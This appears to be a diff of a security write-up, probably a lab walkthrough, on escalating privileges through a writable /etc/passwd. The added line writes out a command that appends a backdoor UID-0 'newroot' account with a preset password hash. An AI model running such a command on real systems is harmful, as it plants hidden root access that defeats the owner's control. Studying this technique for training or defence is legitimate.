@@ -160,9 +160,9 @@ Changing the root password
 
 ![image](https://user-images.githubusercontent.com/83407557/183655779-6ffc90f8-4f36-4674-bebe-3684c1bdf21f.png)
 
-alternatively I can take that same password that I made, and create my own new root user with echo
+alternatively I can take that same password that I made, and create my own new root user with echo and piping it to /etc/passwd
 
-
+`echo 'newroot:wikA5rxUytB.I:0:0:root:/root:/bin/bash'>>/etc/passwd`
 
 ![image](https://user-images.githubusercontent.com/83407557/183656753-fe9ace82-00ad-4ed9-9844-c0a568038482.png)
 
